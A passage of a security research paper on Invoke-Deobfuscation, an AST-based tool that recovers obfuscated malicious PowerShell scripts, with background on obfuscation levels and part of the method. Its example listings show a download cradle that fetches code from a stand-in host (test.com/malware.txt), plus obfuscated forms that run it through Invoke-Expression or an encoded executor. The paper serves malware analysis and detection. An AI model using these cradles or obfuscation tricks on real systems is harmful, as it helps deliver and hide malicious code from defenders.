the ﬁrst challenge is how to precisely identify obfuscated script
pieces. 2. Correct Recovery: the second challenge is how to
correctly recover original script pieces from obfuscated script
pieces. 3. Valid Reconstruction: the last challenge is how to
make sure the ﬁnal reconstructed scripts are valid in syntax
and semantically consistent with the original scripts.
Our Approach. To overcome these challenges, we pro-
pose a deobfuscation approach based on AST,
Invoke-
Deobfuscation. To obtain the correct deobfuscation results,
Invoke-Deobfuscation 1) identiﬁes obfuscated script pieces
based on the tokens and recoverable nodes of AST of scripts,
2) traces variables to get the context of obfuscated script
pieces and recover them with the help of Invoke function,
and 3) reconstructs scripts based on the post-order traversal
of AST and strictly replaces obfuscated pieces in place to
keep the original semantics of scripts as far as possible. To
evaluate the effectiveness of our approach in real PowerShell
scripts, we collected 2,025,175 wild malicious samples. After
preprocessing such as ﬁle type veriﬁcation, syntax validation
and deduplication based on ﬁle content and ﬁle structure, we
ﬁnally get a large dataset including 39,713 PowerShell scripts.
We evaluate Invoke-Deobfuscation from four aspects, i.e., the
ability to deal with different obfuscation techniques, deobfus-
cation effectiveness and efﬁciency, semantic consistency and
obfuscation mitigation. We compare Invoke-Deobfuscation
with four other deobfuscation tools, namely, PSDecode, Pow-
erDrive, PowerDecode and Li et al. The experimental results
demonstrate Invoke-Deobfuscation performs best: 1) Invoke-
Deobfuscation is robust enough to deal with almost all known
obfuscation techniques, 2) Invoke-Deobfuscation performs ef-
ﬁciently and stably, 3) the amount of key information, such
as IP, URL and so on, recovered by Invoke-Deobfuscation is
more than twice that of other tools, 4) Invoke-Deobfuscation
can keep the deobfuscation results consistent with the original
scripts in semantics, 5) Invoke-Deobfuscation can signiﬁcantly
mitigate script obfuscation.
Contributions. This paper makes the following contributions:
• We propose the ﬁrst AST-based and semantics-preserving
deobfuscation approach with variable tracing, Invoke-
Deobfuscation. It can precisely identify and correctly
recover obfuscated script pieces and make sure the de-
obfuscated script’s syntax is valid and the semantics is
unchanged.
• We design and implement
Invoke-Deobfuscation in
PowerShell language, which is a well-designed, cross-
platform and easy-to-use tool. It is easy for developers to
use and integrate our tool’s modules.
• Invoke-Deobfuscation outperforms state-of-the-art tools
in deobfuscation efﬁciency and effectiveness, semantic
consistency, and mitigation of obfuscation. The amount
of key information recovered by Invoke-Deobfuscation
is far beyond that of other tools. All results of Invoke-
Deobfuscation perform the same network behavior as
the original samples. Additionally, Invoke-Deobfuscation
signiﬁcantly reduces the obfuscation score of samples by
46%.
• We introduce a large dataset containing 39,713 wild
malicious PowerShell scripts, which covers all known
obfuscation methods.
To foster future research, we have released the source code
of Invoke-Deobfuscation and the dataset on Gitee1.
II. BACKGROUND AND MOTIVATION
A. PowerShell and PowerShell Attack
PowerShell is a command-line shell and powerful scripting
language. It provides unprecedented access to a machine’s
inner core, including unrestricted access to Windows APIs [1].
PowerShell is a cross-platform (Windows, Linux, and macOS)
tool [20] and pre-installed on Windows [21]. Therefore, Pow-
erShell has become a favorite tool among attackers [4].
PowerShell has been widely used in a variety of cyber
attacks, such as ransomware, phishing emails, persistent threat,
etc. [2], [19]. Attackers can utilize malicious PowerShell
scripts to install Trojans on the victim’s computer, steal
conﬁdential information and obtain admin control, etc. [22],
[23]. PowerShell attacks can not only download malicious
executable ﬁles from remote websites but also load them
directly through system memory to bypass the traditional ﬁle-
based defense methods [1], [23].
B. Obfuscation Techniques for PowerShell
PowerShell scripts can be easily obfuscated in various and
ﬂexible ways to evade the detection of anti-virus software.
Obfuscated scripts are difﬁcult
to understand and analyze
by both human and anti-virus software. According to the
complexity of obfuscation methods, we divide them into three
1https://gitee.com/snowroll/invoke-deobfuscation.
Authorized licensed use limited to: Tsinghua University. Downloaded on August 07,2022 at 13:14:55 UTC from IEEE Xplore.  Restrictions apply. 
2296
levels: L1, L2 and L3. We use different levels of obfuscation
to process the code in Listing 1 and the results are shown in
Listing 2, Listing 3 and Listing 4, respectively.
L1: This level of obfuscation techniques only have textual
and visual effects and affect readability. These obfuscation
techniques include random whitespace insertion (whitespac-
ing), alias, random case and meaningless backtick insertion
(ticking). The backtick character is referred to as the escape
character [24]. The code shown in Listing 2 is an example
with L1 obfuscation. Its intent is easy to understand because
most of the information is retained.
L2: This level of obfuscation techniques will modify the
lexical features and the AST hierarchies of the original scripts,
but they still retain some character-level information of the
original scripts. String-related obfuscation techniques are com-
monly used, such as string concatenating, reordering, replacing
and reversing. Listing 3 shows the code with L2 obfuscation.
Though it is difﬁcult to understand, we can still infer the
general intent of the code from the character-level information.
L3: This level of obfuscation techniques not only change the
lexical features and the AST hierarchies of the original scripts
but also hide the character-level information of the original
scripts. The typical obfuscation techniques of this level are
various encoding methods, e.g., Base64, ASCII, etc. Listing 4
shows the code with L3 obfuscation, we cannot directly infer
the malicious URL from the script’s textual information.
(New-Object Net.WebClient).downloadstring('ht (cid:99)
(cid:44)→
tps://test.com/malware.txt')
1
C. Effectiveness of Obfuscation on Malicious Detection
Obfuscated PowerShell scripts can hide the original intent of
the original scripts and easily evade the detection of anti-virus
software. Current malicious scripts detection models mainly
depend on the character-level features or the AST features
of the scripts [8]–[11], [25]–[27], which can be completely
changed by obfuscation so that these models cannot identify
malicious scripts correctly. Moreover, as shown in section
II-B, the higher the level of obfuscation, the more difﬁcult
it is for us to understand the original intent of the scripts.
Analysts need to use dynamic analysis to infer the intent of
these obfuscated scripts, which is inefﬁcient and has low code
coverage. With the help of a cyber security company, QI-
ANXIN, we have collected 1,127,349 malicious PowerShell
samples from January 1 to May 29, 2021, and ﬁnd that about
98.78% samples are obfuscated. The proportion of different
levels of obfuscation is shown in Table I. Note that one
sample may contain many obfuscation techniques with one,
two or three levels, so the total proportion in Table I is larger
than 100%. Therefore, deobfuscation is very important for
malicious scripts detection and analysis.
TABLE I: Proportion of obfuscation at different levels.
Obfuscation Level
L1
L2
L3
#Samples
1,105,581
1,103,023
1,083,191
Proportion
98.07%
97.84%
96.08%
Listing 1: A simple example without obfuscation.
III. METHODOLOGY
(nEw-oBjECt
(cid:44)→
g('https://test.com/malware.txt')
nET.wEbcLiEnT).DoWNlOaDsTrIn (cid:99)
Listing 2: An example of L1 obfuscation.
Invoke-Expression ((("{13}{0}{8}{6}{12}{16}{7 (cid:99)
(cid:44)→
(cid:44)→
(cid:44)→
(cid:44)→
(cid:44)→
(cid:44)→
}{14}{10}{1}{9}{5}{15}{3}{2}{11}{4}"
-f'e','Uht','om/malwar','t.c','.txtjYU)', (cid:99)
'://','et','nloadst','ct
N','tps','(jY','e','.WebCl','(New-Obj','r (cid:99)
ing','tes','ient).dow')).RepLACe('jYU',[S (cid:99)
TRiNg][CHar]39))
Listing 3: An example of L2 obfuscation.
( '99S5i46}60~@......d60-42~57-46@101@63d51i6 (cid:99)
(cid:44)→
(cid:44)→
(cid:44)→
(cid:44)→
(cid:44)→
3}108}98'-SPLIT'~' -SPLit
'd'-SPliT'}'-sPLiT 'i'-SpliT ',' -SPLit
'J'| fOrEAch-ObJECt{ [cHAR]($_
-BxoR'0x4B' ) })-jOiN'' |& (
$Env:coMSpEC[4,24,25]-JOiN'')
Listing 4: An example of L3 obfuscation.
1
1
1
To overcome the challenges mentioned above, we propose
an AST-based deobfuscation approach with variable trac-
ing, Invoke-Deobfuscation. Fig 2 shows the framework of
Invoke-Deobfuscation. The deobfuscation process of Invoke-
Deobfuscation can be divided into three phases: token parsing,
variable tracing and recovery based on AST, renaming and
reformatting.
We describe each phase in detail as follows.
the lexical
information of
A. Token Parsing
Token parsing uses
scripts
to recover obfuscation. Most obfuscation techniques at
the L1 level are related to tokens,
so we can re-
cover them through token parsing. We tokenize the scripts
library, Sys-
of PowerShell based on Microsoft’s ofﬁcial
tem.Management.Automation.PSParser [28]. Each token con-
tains many attributes, such as content, start, length, etc. We
utilize the attributes of tokens to recover original tokens and
combine them to form a deobfuscation script. Fig 3 shows a
simpliﬁed process of token parsing.
Each token corresponds to a complete lexical unit in the
script, whose attributes can help us to identify and recover
obfuscation on the token.
For instance, if a token’s type is command and its content
is an alias, like IeX in Fig 3, we will replace it with its
Authorized licensed use limited to: Tsinghua University. Downloaded on August 07,2022 at 13:14:55 UTC from IEEE Xplore.  Restrictions apply. 
3297
Fig. 2: An overview of Invoke-Deobfuscation operation scheme.
berExpressionAst and SubExpressionAst. We extract the
content of recoverable nodes as recoverable pieces. Based
on the recoverable nodes, we can identify not only known
obfuscation techniques but also related unknown ones.
2) Recovery Based on Invoke: We execute the recoverable
script pieces through the Invoke function to get their recovery
result. Firstly, we convert the recoverable script piece into
a script block. Then we use its member function Invoke to
execute itself.
For different types of execution results, we convert them into
their corresponding string forms as recovery results to preserve
their semantics. For instance, suppose that
the execution
result’s content is 123 and its type is String, the recovery
result is '123'. If its type is Number, the recovery result
is 123. When the execution result’s type cannot represent in
string form, like Object, we keep the recoverable script pieces.
The recoverable script pieces may contain commands unre-
lated to the recovery process, such as Restart-Computer, Start-
Sleep, etc. Thus, we create a blocklist of these commands to
speed up deobfuscation. If recoverable pieces contain these
irrelevant commands, we do not execute them. For security,
our tool should be run within an isolated sandbox.
3) Variable Tracing: Due to the lack of context, we cannot
directly execute the recoverable pieces containing variables to
get correct recovery results. To overcome this challenge, we
use a symbol table to record the scope and value of variables
appeared in the script. The pseudo code 1 shows the process
of our variable tracing.
We record the scope of each variable appeared in the script
through the structure of AST. According to their accessibility,
there are three types of variables: local variables, global vari-
ables and environment variables. As their names indicate, we
only need to record the scope of local variables. We traverse
the AST in post-order and record the scope of the currently
visited node. Only when visiting the six types of nodes,
namely, NamedblockAst, IfStatementAst, WhileStatemen-